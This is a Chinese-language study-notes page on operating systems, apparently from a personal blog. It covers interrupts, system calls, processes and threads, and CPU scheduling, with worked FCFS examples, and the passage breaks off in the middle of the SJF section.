mode=display">操作系统的运行机制和体系结构\begin{cases}运行机制\begin{cases}两种指令\begin{cases}特权指令：不允许用户程序使用\\非特权指令\end{cases}\\两种处理器状态\begin{cases}核心态(管态)：特权指令、非特权指令都可执行\\用户态(目态)：此时CPU只能执行非特权指令\end{cases}\\两种程序\begin{cases}内核程序：运行在核心态\\应用程序：运行在用户态\end{cases}\end{cases}\\操作系统内核\begin{cases}时钟管理：实现计时功能\\中断处理：负责实现中断机制\\原语\begin{cases}是一种特殊的程序\\处于操作系统最底层，是最接近硬件的部分\\这种程序的运行具有原子性——其运行只能一气呵成，不可中断\\运行时间较短，调用频繁\end{cases}\\对系统资源进行管理的功能\begin{cases}进程管理\\存储器管理\\设备管理\end{cases}\end{cases}\\操作系统的体系结构\begin{cases}大内核\begin{cases}将操作系统的主要功能模块都作为系统内核，运行在核心态\\优点：高性能\\缺点：内核代码庞大，结构混乱，难以维护\end{cases}\\微内核\begin{cases}只把最基本的功能保留在内核\\优点：内核功能少，结构清晰，方便维护\\缺点：需要频繁地在核心态和用户态之间切换，性能低\end{cases}\end{cases}\end{cases}</script><h2 id="1-5-中断和异常"><a href="#1-5-中断和异常" class="headerlink" title="1.5 中断和异常"></a>1.5 中断和异常</h2><p>发生了中断，意味着需要操作系统的介入，开展管理工作。由于操作系统的管理工作(比如进程切换、分配I/O设备等)需要使用特权指令，因此CPU要从用户态转为核心态。中断可以使CPU从用户态切换为核心态，使操作系统获得计算机的控制权。有了中断，才能实现多道程序并发执行。</p><p>用户态、核心态之间的切换是怎么实现的？</p><p>答：用户态 -&gt; 核心态是通过中断实现的，并且<strong>中断</strong>是<strong>唯一</strong>途径。</p><p>​        核心态 -&gt; 用户态的切换是通过执行一个特权指令，将程序状态字的标志位设置为“用户态”。</p><h3 id="1-5-1-中断的分类"><a href="#1-5-1-中断的分类" class="headerlink" title="1.5.1 中断的分类"></a>1.5.1 中断的分类</h3><script type="math/tex; mode=display">中断\begin{cases}内中断(也称异常、例外、陷入)\begin{cases}自愿中断——指令中断，如系统调用时使用的访管指令\\强迫中断\begin{cases}硬件故障，如缺页\\软件中断，如整数除0\end{cases}\end{cases}\\外中断(中断)\begin{cases}外设请求，如I/O操作完成发出的中断信号\\人工干预，如用户强行终止一个进程\end{cases}\end{cases}</script><p>内中断信号来源于CPU内部，与当前执行的指令有关；外中断信号来源于CPU外部，与当前执行的指令无关。</p><h3 id="1-5-2-外中断的处理过程"><a href="#1-5-2-外中断的处理过程" class="headerlink" title="1.5.2 外中断的处理过程"></a>1.5.2 外中断的处理过程</h3><ol><li>每条指令执行结束后，CPU检查是否有外部中断信号</li><li>若有外部中断信号，则需要保护被中断进程的CPU环境</li><li>根据中断信号类型转入相应的中断处理程序</li><li>恢复原进程的CPU环境并退出中断，返回原进程继续往下执行</li></ol><h2 id="1-6-系统调用"><a href="#1-6-系统调用" class="headerlink" title="1.6 系统调用"></a>1.6 系统调用</h2><p>系统调用是操作系统提供给应用程序(程序员/编程人员)使用的接口，可以理解为一种可供应用程序调用的特殊函数，应用程序可以发出系统调用请求来获得操作系统的服务。</p><p>应用程序通过系统调用请求操作系统。系统中的各种共享资源都由操作系统统一掌管，因此在用户程序中，凡是与资源有关的操作(如存储分配、I/O操作、文件管理等)，都必须通过系统调用的方式向操作系统提出服务请求，由操作系统代为完成。这样可以保证系统的稳定性和安全性，防止用户进行非法操作。</p><script type="math/tex; mode=display">系统调用(按功能分类)\begin{cases}设备管理：完成设备的请求/释放/启动等功能\\文件管理：完成文件的读/写/创建/删除等功能\\进程控制：完成进程的创建/撤销/阻塞/唤醒等功能\\进程通信：完成进程之间消息传递/信号传递等功能\\内存管理：完成内存的分配/回收等功能\end{cases}</script><p>系统调用相关处理涉及到对系统资源的管理、对进程的控制，这些功能需要执行一些特权指令才能完成，因此系统调用的相关处理需要在核心态下完成。</p><h3 id="1-6-1-系统调用和库函数的区别"><a href="#1-6-1-系统调用和库函数的区别" class="headerlink" title="1.6.1 系统调用和库函数的区别"></a>1.6.1 系统调用和库函数的区别</h3><p>系统调用是操作系统向上层提供的接口，有的库函数是对系统调用的进一步封装，当今编写的应用程序大多是通过高级语言提供的库函数间接地进行系统调用。</p><h3 id="1-6-2-系统调用背后的过程"><a href="#1-6-2-系统调用背后的过程" class="headerlink" title="1.6.2 系统调用背后的过程"></a>1.6.2 系统调用背后的过程</h3><ol><li>传递系统调用参数</li><li>执行陷入指令(如int 0x80)（用户态）</li><li>执行系统调用相应服务程序（核心态）</li><li>返回用户程序</li></ol><p>陷入指令是唯一一个只能在用户态执行，而不可在核心态执行的指令。</p><h1 id="2-进程"><a href="#2-进程" class="headerlink" title="2. 进程"></a>2. 进程</h1><p><strong>程序段、数据段、PCB(进程控制块)</strong>三部分组成了<strong>进程实体(进程映像)</strong>。一般情况下，我们把进程实体就简称为进程。<strong>PCB是进程存在的唯一标志。</strong></p><script type="math/tex; mode=display">PCB\begin{cases}进程描述信息\begin{cases}进程标识符PID\\用户标识符UID\end{cases}\\进程控制和管理信息\begin{cases}进程当前状态\\进程优先级\end{cases}\\资源分配清单\begin{cases}程序段指针\\数据段指针\\键盘\\鼠标\end{cases}\\处理机相关信息\begin{cases}各种寄存器值\end{cases}\end{cases}</script><h2 id="2-1-进程的组成"><a href="#2-1-进程的组成" class="headerlink" title="2.1 进程的组成"></a>2.1 进程的组成</h2><script type="math/tex; mode=display">进程的组成\begin{cases}PCB\begin{cases}进程描述信息\\进程控制和管理信息\\资源分配清单\\处理机相关信息\end{cases}\\程序段：存放要执行的代码\\数据段：存放程序运行过程中处理的各种数据\end{cases}</script><p>操作系统所需的数据在PCB中，程序本身运行所需的数据在程序段和数据段中。</p><h2 id="2-2-进程的组织"><a href="#2-2-进程的组织" class="headerlink" title="2.2 进程的组织"></a>2.2 进程的组织</h2><p>在一个系统中，通常有数十、数百乃至数千个PCB。为了能对它们加以有效的管理，应该用适当的方式把这些PCB组织起来。</p><script type="math/tex; mode=display">进程的组织方式\begin{cases}链接方式\begin{cases}按照进程状态将PCB分为多个队列\\操作系统持有指向各个队列的指针\end{cases}\\索引方式\begin{cases}根据进程状态的不同，建立几张索引表\\操作系统持有指向各个索引表的指针\end{cases}\end{cases}</script><h2 id="2-3-进程的特征"><a href="#2-3-进程的特征" class="headerlink" title="2.3 进程的特征"></a>2.3 进程的特征</h2><ul><li>动态性：进程最基本的特征，进程是程序的一次执行过程，是动态地产生、变化和消亡的</li><li>并发性：内存中有多个进程实体，各进程可并发执行</li><li>独立性：进程是能独立运行、独立获得资源、独立接受调度的基本单位</li><li>异步性：各进程按各自独立的、不可预知的速度向前推进。异步性会导致并发程序执行结果的不确定性</li><li>结构性：每个进程都会配置一个PCB，从结构上看，进程由程序段、数据段和PCB组成</li></ul><h2 id="2-4-进程的状态"><a href="#2-4-进程的状态" class="headerlink" title="2.4 进程的状态"></a>2.4 进程的状态</h2><script type="math/tex; mode=display">进程的状态和转换\begin{cases}状态\begin{cases}运行状态：占有CPU，并在CPU上运行\\就绪状态：已经具备运行条件，但由于没有空闲CPU，而暂时不能运行\\阻塞状态：因等待某一事件而暂时不能运行\\创建状态：进程正在被创建，操作系统为进程分配资源，初始化PCB\\终止状态：进程正在从系统中撤销，操作系统会回收进程拥有的资源，撤销PCB\end{cases}\\进程状态间的转换\begin{cases}就绪态\to 运行态：进程被调度\\运行态\to就绪态：时间片到，或CPU被其他高优先级的进程抢占\\运行态\to 阻塞态：等待系统资源分配，或等待某事件发生(主动行为)\\阻塞态\to 就绪态：资源分配到位，等待的时间发生(被动行为)\end{cases}\end{cases}</script><p>单核处理机环境下，每一时刻最多只有一个进程处于运行态。如果是双核，则最多两个，以此类推。</p><p>注意：不能由阻塞态直接转换为运行态，也不能由就绪态直接转换为阻塞态。因为进入阻塞态是进程主动请求的，必然需要进程在运行时才能发出这种请求。</p><h2 id="2-5-进程控制"><a href="#2-5-进程控制" class="headerlink" title="2.5 进程控制"></a>2.5 进程控制</h2><p>进程控制的主要功能是对系统中的所有进程实施有效的管理，它具有创建新进程、撤销已有进程、实现进程状态转换等功能。</p><p>用原语实现进程控制。原语的特点是执行期间不允许中断，只能一气呵成。这种不可被中断的操作即原子操作。原语采用“关中断指令”和“开中断指令”实现。</p><script type="math/tex; mode=display">进程的创建\begin{cases}创建原语\begin{cases}1.申请空白PCB\\2.为新进程分配所需资源\\3.初始化PCB\\4.将PCB插入就绪队列\end{cases}\\引起进程创建的事件\begin{cases}用户登录：分时系统中，用户登录成功，系统会为其建立一个新的进程\\作业调度：多道批处理系统中，有新的作业放入内存时，会为其建立一个新的进程\\提供服务：用户向操作系统提出某些请求时，会新建一个进程处理该请求\\应用请求：由用户进程主动请求创建一个子进程\end{cases}\end{cases}</script><script type="math/tex; mode=display">进程的终止\begin{cases}撤销原语\begin{cases}1.从PCB集合中找到终止进程的PCB\\2.若进程正在运行，立即剥夺CPU，将CPU分配给其他进程\\3.终止其所有子进程\\4.将该进程拥有的所有资源归还给父进程或操作系统\\5.删除PCB\end{cases}\\引起进程终止的事件\begin{cases}正常结束\\异常结束\\外界干预\end{cases}\end{cases}</script><script type="math/tex; mode=display">进程的阻塞\begin{cases}阻塞原语\begin{cases}1.找到要阻塞的进程对应的PCB\\2.保护进程运行现场，将PCB状态信息设置为阻塞态，暂时停止进程运行\\3.将PCB插入相应事件的等待队列\end{cases}\\引起进程阻塞的事件\begin{cases}需要等待系统分配某种资源\\需要等待相互合作的其它进程完成工作\end{cases}\end{cases}</script><script type="math/tex; mode=display">进程的唤醒\begin{cases}唤醒原语\begin{cases}1.在事件等待队列中找到PCB\\2.将PCB从等待队列移除，设置进程为就绪态\\3.将PCB插入就绪队列，等待被调度\end{cases}\\引起进程唤醒的事件：等待的事件发生\end{cases}</script><p>阻塞原语唤醒原语必须成对使用。</p><script type="math/tex; mode=display">进程的切换\begin{cases}切换原语\begin{cases}1.将运行环境信息存入PCB\\2.PCB移入相应队列\\3.选择另一个进程执行，并更新其PCB\\4.根据PCB恢复新进程所需的运行环境\end{cases}\\引起进程切换的事件\begin{cases}当前进程时间片到\\有更高优先级的进程到达\\当前进程主动阻塞\\当前进程终止\end{cases}\end{cases}</script><h2 id="2-6-进程通信"><a href="#2-6-进程通信" class="headerlink" title="2.6 进程通信"></a>2.6 进程通信</h2><script type="math/tex; mode=display">进程通信\begin{cases}共享存储\begin{cases}基于数据结构的共享\\基于存储区的共享\end{cases}\\消息传递\begin{cases}直接通信方式：消息直接挂到接收方的消息队列里\\间接通信方式：消息先发到中间体(信箱)\end{cases}\\管道通信\begin{cases}一个管道只能实现半双工通道\\写满时，不能再写。读空时，不能再读\\没写满，不能读。没读空，不能写\end{cases}\end{cases}</script><p>进程通信就是指进程之间的信息交换。进程是分配系统资源的单位(包括内存地址空间)，因此各进程拥有的内存地址空间相互独立。</p><p>为了保证安全，一个进程不能直接访问另一个进程的地址空间。但是进程之间的信息交换又是必须实现的，为了保证进程间的安全通信，操作系统提供了一些方法。</p><h3 id="2-6-1-共享存储"><a href="#2-6-1-共享存储" class="headerlink" title="2.6.1 共享存储"></a>2.6.1 共享存储</h3><p>两个进程对共享空间的访问必须是互斥的。</p><p>基于数据结构的共享：比如共享空间里只能放一个长度为10的数组。这种共享方式速度慢、限制多，是一种低级通信方式。</p><p>基于存储区的共享：在内存中画出一块共享存储区，数据的形式、存放位置都由进程控制，而不是操作系统。相比之下，这种共享方式速度更快，是一种高级通信方式。</p><h3 id="2-6-2-管道通信"><a href="#2-6-2-管道通信" class="headerlink" title="2.6.2 管道通信"></a>2.6.2 管道通信</h3><p>“管道”是指用于连接读写进程的一个共享文件，又名pipe文件。其实就是在内存中开辟一个大小固定的缓冲区。</p><ol><li><p>管道只能采用半双工通信，某一时间段内只能实现单向的传输。如果要实现双向同时通信，则需要设置两个管道。</p></li><li><p>各进程要互斥地访问管道。</p></li><li><p>数据以字符流的形式写入管道，当管道写满时，写进程的write() 系统调用将被阻塞，等待读进程将数据取走。当读进程将数据全部取走后，管道变空，此时读进程的read() 系统调用将被阻塞。（缓冲区的特性）</p></li><li><p>如果没写满，就不允许读。如果没读空，就不允许写。（缓冲区的特性）</p></li><li><p>数据一旦被读出，就从管道中被抛弃，这就意味着读进程最多只能有一个，否则可能会有读错数据的情况。</p></li></ol><h3 id="2-6-3-消息传递"><a href="#2-6-3-消息传递" class="headerlink" title="2.6.3 消息传递"></a>2.6.3 消息传递</h3><p>进程间的数据交换以格式化的消息（Message）为单位。进程通过操作系统提供的“发送消息/接收消息”两个原语进行数据交换。</p><ul><li>直接消息传递：消息直接挂到接收进程的消息缓冲队列上</li><li>间接消息传递：消息要先发送到中间实体(信箱)中，因此也称“信箱通信方式”。如：计网中的电子邮件系统</li></ul><h2 id="2-7-线程"><a href="#2-7-线程" class="headerlink" title="2.7 线程"></a>2.7 线程</h2><p>有的进程可能需要“同时”做很多事，而传统的进程只能串行地执行一系列程序。为此，引入了“线程”，来增加并发度。可以把线程理解为“轻量级进程”。</p><p><strong>线程是一个基本的CPU执行单元，也是程序执行流的最小单位</strong>。引入线程之后，不仅是进程之间可以并发，进程内的各线程之间也可以并发，从而进一步提升了系统的并发度，使得一个进程内也可以并发处理各种任务。引入线程后，进程只作为除CPU之外的系统资源的分配单元。</p><h3 id="2-7-1-线程的实现方式"><a href="#2-7-1-线程的实现方式" class="headerlink" title="2.7.1 线程的实现方式"></a>2.7.1 线程的实现方式</h3><p>用户级线程由应用程序通过线程库实现。所有的线程管理工作都由应用程序负责(包括线程切换)，用户级线程中，线程切换可以在用户态下即可完成，无需操作系统干预。</p><p>内核级线程的管理工作由操作系统内核完成。线程调度、切换等工作都由内核负责，因此内核级线程的切换必然需要在核心态下才能完成。</p><p>注意：操作系统只“看得见”内核级线程，因此只有内核级线程才是处理机分配的单位。</p><h3 id="2-7-2-多线程模型"><a href="#2-7-2-多线程模型" class="headerlink" title="2.7.2 多线程模型"></a>2.7.2 多线程模型</h3><p>在同时支持用户级线程和内核级线程的系统中，由几个用户级线程映射到几个内核级线程的问题引出了“多线程模型”问题。</p><p>多对一模型：多个用户级线程映射到一个内核级线程。每个用户进程只对应一个内核级线程。</p><blockquote><p>优点：用户级线程的切换在用户空间即可完成，不需要切换到核心态，线程管理的系统开销小，效率高</p><p>缺点：当一个用户级线程被阻塞后，整个进程都会被阻塞，并发度不高。多个线程不可在多核处理机上并行运行</p></blockquote><p>一对一模型：一个用户级线程映射到一个内核级线程。每个用户进程有与用户级线程同数量的内核级线程。</p><blockquote><p>优点：当一个线程被阻塞后，别的线程还可以继续执行，并发能力强。多线程可在多核处理机上并行执行</p><p>缺点：一个用户进程会占用多个内核级线程，线程切换由操作系统内核完成，需要切换到核心态，因此线程管理的成本高，开销大</p></blockquote><p>多对多模型：n 用户级线程映射到m 个内核级线程（n &gt;= m）。每个用户进程对应 m 个内核级线程。</p><blockquote><p>优点：克服了多对一模型并发度不高的缺点(一个阻塞全体阻塞)，又克服了一对一模型中一个用户进程占用太多内核级线程，开销太大的缺点</p></blockquote><h2 id="2-8-处理机调度"><a href="#2-8-处理机调度" class="headerlink" title="2.8 处理机调度"></a>2.8 处理机调度</h2><p>当有一堆任务要处理，但由于资源有限，这些事情没法同时处理。这就需要确定某种规则来决定处理这些任务的顺序，这就是“调度”研究的问题。</p><p>在多道程序系统中，进程的数量往往是多于处理机的个数的，这样不可能同时并行地处理各个进程。处理机调度，就是从就绪队列中按照一定的算法选择一个进程并将处理机分配给它运行，以实现进程的并发执行。</p><h3 id="2-8-1-调度的三个层次"><a href="#2-8-1-调度的三个层次" class="headerlink" title="2.8.1 调度的三个层次"></a>2.8.1 调度的三个层次</h3><h4 id="2-8-1-1-高级调度-作业调度"><a href="#2-8-1-1-高级调度-作业调度" class="headerlink" title="2.8.1.1 高级调度(作业调度)"></a>2.8.1.1 高级调度(作业调度)</h4><p>由于内存空间有限，有时无法将用户提交的作业全部放入内存，因此就需要确定某种规则来决定将作业调入内存的顺序。</p><p>高级调度（作业调度），按一定的原则从外存上处于后备队列的作业中挑选一个（或多个）作业，给他们分配内存等必要资源，并建立相应的进程（建立PCB），以使它（们）获得竞争处理机的权利。</p><p>高级调度是辅存（外存）与内存之间的调度。每个作业只调入一次，调出一次。作业调入时会建立相应的PCB，作业调出时才撤销PCB。高级调度主要是指调入的问题，因为只有调入的时机需要操作系统来确定，但调出的时机必然是作业运行结束才调出。</p><h4 id="2-8-1-2-中级调度-内存调度"><a href="#2-8-1-2-中级调度-内存调度" class="headerlink" title="2.8.1.2 中级调度(内存调度)"></a>2.8.1.2 中级调度(内存调度)</h4><p>引入了虚拟存储技术之后，可将暂时不能运行的进程调至外存等待。等它重新具备了运行条件且内存又稍有空闲时，再重新调入内存。这么做的目的是为了提高内存利用率和系统吞吐量。</p><p>暂时调到外存等待的进程状态为挂起状态。值得注意的是，PCB并不会一起调到外存，而是会常驻内存。PCB中会记录进程数据在外存中的存放位置，进程状态等信息，操作系统通过内存中的PCB来保持对各个进程的监控、管理。被挂起的进程PCB会被放到的挂起队列中。</p><p>中级调度（内存调度），就是要决定将哪个处于挂起状态的进程重新调入内存。</p><p>一个进程可能会被多次调出、调入内存，因此中级调度发生的频率要比高级调度更高。</p><h4 id="2-8-1-3-低级调度-进程调度"><a href="#2-8-1-3-低级调度-进程调度" class="headerlink" title="2.8.1.3 低级调度(进程调度)"></a>2.8.1.3 低级调度(进程调度)</h4><p>低级调度（进程调度），其主要任务是按照某种方法和策略从就绪队列中选取一个进程，将处理机分配给它。</p><p>进程调度是操作系统中最基本的一种调度，在一般的操作系统中都必须配置进程调度。进程调度的频率很高，一般几十毫秒一次。</p><img src="/posts/d04bd5bc/2.8.1.png" class="" title="处理机调度的三个层次"><h3 id="2-8-2-进程的挂起态与七状态模型"><a href="#2-8-2-进程的挂起态与七状态模型" class="headerlink" title="2.8.2 进程的挂起态与七状态模型"></a>2.8.2 进程的挂起态与七状态模型</h3><p>暂时调到外存等待的进程状态为挂起状态（挂起态，suspend）。</p><p>挂起态又可以进一步细分为就绪挂起、阻塞挂起两种状态。</p><p>五状态模型 -&gt; 七状态模型</p><img src="/posts/d04bd5bc/2.8.2.png" class="" title="七状态模型"><p>注意“挂起”和“阻塞”的区别，两种状态都是暂时不能获得CPU的服务，但挂起态是将进程映像调到外存去了，而阻塞态下进程映像还在内存中。</p><p>有的操作系统会把就绪挂起、阻塞挂起分为两个挂起队列，甚至会根据阻塞原因不同再把阻塞挂起进程进一步细分为多个队列。</p><h3 id="2-8-3-进程调度的时机"><a href="#2-8-3-进程调度的时机" class="headerlink" title="2.8.3 进程调度的时机"></a>2.8.3 进程调度的时机</h3><p>进程调度（低级调度），就是按照某种算法从就绪队列中选择一个进程为其分配处理机。</p><img src="/posts/d04bd5bc/2.8.3.png" class="" title="进程调度切换"><p>临界资源：一个时间段内只允许一个进程使用的资源。各进程需要互斥地访问临界资源。</p><p>临界区：访问临界资源的那段代码。</p><p><strong>内核程序临界区</strong>一般是用来访问某种内核数据结构的，比如进程的就绪队列（由各就绪进程的PCB组成）。</p><p>进程在<strong>操作系统内核程序临界区</strong>不能进行调度与切换。（√）</p><p>进程处于<strong>临界区</strong>时不能进行处理机调度。（×）</p><h3 id="2-8-4-进程调度的方式"><a href="#2-8-4-进程调度的方式" class="headerlink" title="2.8.4 进程调度的方式"></a>2.8.4 进程调度的方式</h3><ul><li><p>非剥夺调度方式，又称非抢占方式。即，只允许进程主动放弃处理机。在运行过程中即便有更紧迫的任务到达，当前进程依然会继续使用处理机，直到该进程终止或主动要求进入阻塞态。</p><p>实现简单，系统开销小但是无法及时处理紧急任务，适合于早期的批处理系统。</p></li><li><p>剥夺调度方式，又称抢占方式。当一个进程正在处理机上执行时，如果有一个更重要或更紧迫的进程需要使用处理机，则立即暂停正在执行的进程，将处理机分配给更重要紧迫的那个进程。</p><p>可以优先处理更紧急的进程，也可实现让各进程按时间片轮流执行的功能（通过时钟中断）。适合于分时操作系统、实时操作系统。</p></li></ul><h3 id="2-8-5-进程的切换与过程"><a href="#2-8-5-进程的切换与过程" class="headerlink" title="2.8.5 进程的切换与过程"></a>2.8.5 进程的切换与过程</h3><p>“狭义的进程调度”与“进程切换”的区别：狭义的进程调度指的是从就绪队列中选中一个要运行的进程（这个进程可以是刚刚被暂停执行的进程，也可能是另一个进程，后一种情况就需要进程切换）；进程切换是指一个进程让出处理机，由另一个进程占用处理机的过程。</p><p>广义的进程调度包含了<strong>选择一个进程</strong>和<strong>进程切换</strong>两个步骤。</p><p>进程切换的过程主要完成了：</p><ol><li><p>对原来运行进程各种数据的保存</p></li><li><p>对新的进程各种数据的恢复<br>（如：程序计数器、程序状态字、各种数据寄存器等处理机现场信息，这些信息一般保存在进程控制块）</p></li></ol><p>注意：进程切换是有代价的，因此如果过于频繁的进行进程调度、切换，必然会使整个系统的效率降低，使系统大部分时间都花在了进程切换上，而真正用于执行进程的时间减少。</p><h3 id="2-8-6-调度算法的评价指标"><a href="#2-8-6-调度算法的评价指标" class="headerlink" title="2.8.6 调度算法的评价指标"></a>2.8.6 调度算法的评价指标</h3><h4 id="2-8-6-1-CPU利用率"><a href="#2-8-6-1-CPU利用率" class="headerlink" title="2.8.6.1 CPU利用率"></a>2.8.6.1 CPU利用率</h4><p>CPU利用率：指CPU “忙碌”的时间占总时间的比例。</p><script type="math/tex; mode=display">利用率 = \frac{忙碌的时间}{总时间}</script><p>例：某计算机只支持单道程序，某个作业刚开始需要在CPU上运行5秒，再用打印机打印输出5秒，之后再执行5秒，才能结束。在此过程中，CPU利用率、打印机利用率分别是多少？</p><script type="math/tex; mode=display">CPU利用率 = \frac{5+5}{5+5+5} = 66.6\%\\打印机利用率 = \frac{5}{5+5+5} = 33.3\%</script><h4 id="2-8-6-2-系统吞吐量"><a href="#2-8-6-2-系统吞吐量" class="headerlink" title="2.8.6.2 系统吞吐量"></a>2.8.6.2 系统吞吐量</h4><p>系统吞吐量：单位时间内完成作业的数量。</p><script type="math/tex; mode=display">系统吞吐量 = \frac{总共完成了多少道作业}{总共花了多少时间}</script><p>例：某计算机系统处理完10道作业，共花费100秒，则系统吞吐量为？</p><script type="math/tex; mode=display">系统吞吐量 = \frac{10}{100}=0.1道/秒</script><h4 id="2-8-6-3-周转时间"><a href="#2-8-6-3-周转时间" class="headerlink" title="2.8.6.3 周转时间"></a>2.8.6.3 周转时间</h4><p>周转时间：从作业被提交给系统开始，到作业完成为止的这段时间间隔。</p><p>它包括四个部分：</p><ul><li>作业在外存后备队列上等待作业调度（高级调度）的时间</li><li>进程在就绪队列上等待进程调度（低级调度）的时间</li><li>进程在CPU上执行的时间</li><li>进程等待I/O操作完成的时间</li></ul><p>后三项在一个作业的整个处理过程中，可能发生多次。</p><p>对于用户来说，更关心自己的单个作业的周转时间：</p><script type="math/tex; mode=display">周转时间 = 作业完成时间 - 作业提交时间</script><p>对于操作系统来说，更关心系统的整体表现，因此更关心所有作业周转时间的平均值：</p><script type="math/tex; mode=display">平均周转时间 = \frac{各作业周转时间之和}{作业数}</script><p>对于周转时间相同的两个作业，实际运行时间长的作业在相同时间内被服务的时间更多，带权周转时间更小，用户满意度更高：</p><script type="math/tex; mode=display">带权周转时间 = \frac{周转时间}{作业实际运行的时间} = \frac{作业完成时间 - 作业提交时间}{作业实际运行的时间}</script><p>平均带权周转时间：</p><script type="math/tex; mode=display">平均带权周转时间 = \frac{各作业带权周转时间之和}{作业数}</script><h4 id="2-8-6-4-等待时间"><a href="#2-8-6-4-等待时间" class="headerlink" title="2.8.6.4 等待时间"></a>2.8.6.4 等待时间</h4><p>计算机的用户希望自己的作业尽可能少的等待处理机。</p><p>等待时间：指进程/作业处于等待处理机状态时间之和，等待时间越长，用户满意度越低。</p><p>对于进程来说，等待时间就是指进程建立后等待被服务的时间之和，在等待I/O完成的期间其实进程也是在被服务的，所以不计入等待时间。</p><p>对于作业来说，不仅要考虑建立进程后的等待时间，还要加上作业在外存后备队列中等待的时间。</p><p>一个作业总共需要被CPU服务多久，被I/O设备服务多久一般是确定不变的，因此调度算法其实只会影响作业/进程的等待时间。当然，与前面指标类似，也有“平均等待时间”来评价整体性能。</p><h4 id="2-8-6-5-响应时间"><a href="#2-8-6-5-响应时间" class="headerlink" title="2.8.6.5 响应时间"></a>2.8.6.5 响应时间</h4><p>对于计算机用户来说，会希望自己的提交的请求（比如通过键盘输入了一个调试命令）尽早地开始被系统服务、回应。</p><p>响应时间：指从用户提交请求到首次产生响应所用的时间。</p><h3 id="2-8-7-调度算法"><a href="#2-8-7-调度算法" class="headerlink" title="2.8.7 调度算法"></a>2.8.7 调度算法</h3><p>Tips：各种调度算法的学习思路</p><ol><li>算法思想</li><li>算法规则</li><li>这种调度算法是用于作业调度还是进程调度？</li><li>抢占式？非抢占式？</li><li>优点和缺点</li><li>是否会导致饥饿</li></ol><p>饥饿：某进程 / 作业长期得不到服务。</p><h4 id="2-8-7-1-FCFS-先来先服务"><a href="#2-8-7-1-FCFS-先来先服务" class="headerlink" title="2.8.7.1 FCFS(先来先服务)"></a>2.8.7.1 FCFS(先来先服务)</h4><p>算法思想：主要从“公平”的角度考虑</p><p>算法规则：按照作业 / 进程到达的先后顺序进行服务</p><p>用于作业 / 进程调度：用于作业调度时，考虑的是哪个作业先到达后备队列；用于进程调度时，考虑的是哪个进程先到达就绪队列</p><p>是否可抢占：非抢占式的算法</p><p>优点：公平、算法实现简单</p><p>缺点：排在长作业（进程）后面的短作业需要等待很长时间，带权周转时间很大，对短作业来说用户体验不好。即，FCFS算法对长作业有利，对短作业不利</p><p>是否会导致饥饿：不会产生饥饿现象</p><p>例：各进程到达就绪队列的时间、需要的运行时间如下表所示。使用FCFS调度算法，计算各进程的等待时间、平均等待时间、周转时间、平均周转时间、带权周转时间、平均带权周转时间。</p><div class="table-container"><table><thead><tr><th>进程</th><th>到达时间</th><th>运行时间</th></tr></thead><tbody><tr><td>P1</td><td>0</td><td>7</td></tr><tr><td>P2</td><td>2</td><td>4</td></tr><tr><td>P3</td><td>4</td><td>1</td></tr><tr><td>P4</td><td>5</td><td>4</td></tr></tbody></table></div><p>FCFS，所以调度顺序为：P1-&gt;P2-&gt;P3-&gt;P4</p><p>周转时间 = 作业完成时间 - 作业提交(到达)时间</p><script type="math/tex; mode=display">P1=7-0=7\\P2=(7+4) - 2=9\\P3=(7+4+1)-4=8\\P4=(7+4+1+4)-5=11</script><p>平均周转时间 = 周转时间之和 / 作业数</p><script type="math/tex; mode=display">平均周转时间 = \frac{7+9+8+11}{4}=8.75</script><p>带权周转时间 = 周转时间 / 作业实际运行的时间</p><script type="math/tex; mode=display">P1=\frac{7}{7} =1\\P2=\frac{9}{4}=2.25\\P3=\frac{8}{1}=8\\P4=\frac{11}{4}=2.75</script><p>平均带权周转时间 = 带权周转时间之和 / 作业数</p><script type="math/tex; mode=display">平均带权周转时间 = \frac{1+2.25+8+2.75}4=3.5</script><p>等待时间 = 周转时间 - 运行时间 - I/O操作的时间(这里为0)</p><script type="math/tex; mode=display">P1=7-7=0\\P2=9-4=5\\P3=8-1=7\\P4=11-4=7</script><p>平均等待时间 = 总等待时间 / 作业数</p><script type="math/tex; mode=display">平均等待时间 = \frac{0+5+7+7}{4}=4.75</script><h4 id="2-8-7-2-SJF-短作业优先"><a href="#2-8-7-2-SJF-短作业优先" class="headerlink" title="2.8.7.2 SJF(短作业优先)"></a>2.8.7.2 SJF(短作业优先)</h4><p>算法思想：追求最少的平均等待时间，最少的平均周转时间、最少的平均平均带权周转时间</p><p>算法规则：最短的作业 / 进程优先得到服务（所谓“最短”，是指要求服务时间最短）</p><p>用于作业 / 进程调度：即可用于作业调度，也可用于进程调度。用于进程调度时称为“短进程优先(SPF, Shortest Process First)算法”</p><p>是否可抢占：SJF和SPF是非抢占式的算法。但是也有抢占式的版本——最短剩余时间优先算法(SRTN, Shortest Remaining Time Next)</p><p>优点：“最短的”平均等待时间、平均周转时间</p><p>缺点：不公平。对短作业有利，对长作业不利。可能产生饥饿现象。另外，作业/进程的运行时间是由用户提供的，并不一定真实，不一定能做到真正的短作业优先</p><p>是否会导致饥饿：会产生饥饿现象。如果源源不断地有短作业/进程到来，可能使长作业/进程长时间得不到服务，产生“饥饿”现象。如果一直得不到服务，则称为“饿死”</p><p>例：例题同上，使用<strong>非抢占式</strong>的短作业优先算法。</p><p>短作业/进程优先调度算法：每次调度时选择<strong>当前已到达</strong>且<strong>运行时间最短</strong>的作业/进程。所以，调度顺序为：P1-&gt;P3-&gt;P2-&gt;P4</p><p>例：例题同上，使用<strong>抢占式</strong>的短作业优先算法。</p><p>最短剩余时间优先算法：每当有进程加入就绪队列改变时就需要调度，如果新到达的进程剩余时间比当前运行的进程剩余时间更短，则由新进程抢占处理机，当前运行进程重新回到就绪队列。另外，当一个进程完成时也需要调度。</p><p>需要注意的是，当有新进程到达时就绪队列就会改变，就要按照上述规则进行检查。以下<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="6.347ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2805.3 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 